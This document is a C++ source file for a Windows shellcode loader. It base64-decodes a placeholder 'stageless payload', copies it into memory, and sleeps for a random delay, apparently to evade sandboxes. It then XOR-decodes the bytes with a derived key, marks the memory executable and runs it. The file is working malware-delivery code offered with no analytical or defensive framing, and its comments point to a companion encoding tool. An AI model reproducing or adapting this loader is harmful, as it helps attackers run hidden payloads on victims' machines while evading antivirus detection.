#include <windows.h>
#include <winternl.h>
#include <ctime>
#include "base64.h"

int random_waitime();

void wait();

void decipher_alloc(LPVOID alloc);

void run_code();

//USE THE PYTHON TOOL
const std::string codeb64 = "<stageless_payload base64>" \
	"<stageless_payload base64>" \
  "<stageless_payload base64>" \
//....

std::string decode = base64_decode(codeb64);
size_t SIZE_ENCODE = decode.length();

int main() {
	HANDLE hthread = CreateThread(
		NULL,
		0,
		(LPTHREAD_START_ROUTINE)run_code,
		NULL,
		0,
		NULL);
	if (hthread == NULL) {
		return EXIT_FAILURE;
	}

	WaitForSingleObject(hthread, INFINITE);
	CloseHandle(hthread);
	return EXIT_SUCCESS;
}


int random_waitime() {
	srand((unsigned int)time(NULL));
	return (rand() % 5) + 1;
}

void wait() {
	ULONGLONG startTickCount = GetTickCount64();
	int timeToWait = 5000 * random_waitime();
	while (true) {
		ULONGLONG currentTickCount = GetTickCount64();
		ULONGLONG tickCountDiff = currentTickCount - startTickCount;
		if (tickCountDiff >= timeToWait) {
			break;
		}
		Sleep(100);
	}
}

void decipher_alloc(LPVOID alloc) {
	auto* bytes = (unsigned char*)alloc;
	int total = 0;
	for (int i = 0; i < SIZE_ENCODE; i++) {
		total += bytes[i];
	}

	int subtract = 0; //USE THE PYTHON TOOL
	size_t key = total / SIZE_ENCODE - subtract;
	for (int i = 0; i < SIZE_ENCODE; i++) {
		bytes[i] ^= key;
	}
}

void run_code() {
	LPVOID alloc_memory = VirtualAlloc(
		NULL,
		SIZE_ENCODE,
		(MEM_RESERVE | MEM_COMMIT),
		PAGE_READWRITE
	);

	if (alloc_memory == NULL) {
		return;
	}

	memcpy(alloc_memory, decode.data(), SIZE_ENCODE);
	wait();
	
	decipher_alloc(alloc_memory);
	DWORD old_protect;
	if (!VirtualProtect(
		alloc_memory,
		SIZE_ENCODE,
		PAGE_EXECUTE_READWRITE,
		&old_protect)) {
		return;
	}

	void (*funct)() = (void (*)())alloc_memory;
	funct();

	if (!VirtualProtect(
		alloc_memory,
		SIZE_ENCODE,
		old_protect,
		&old_protect)) {
		return;
	}

	if (!VirtualFree(alloc_memory, 0, MEM_RELEASE)) {
		return;
	}
}
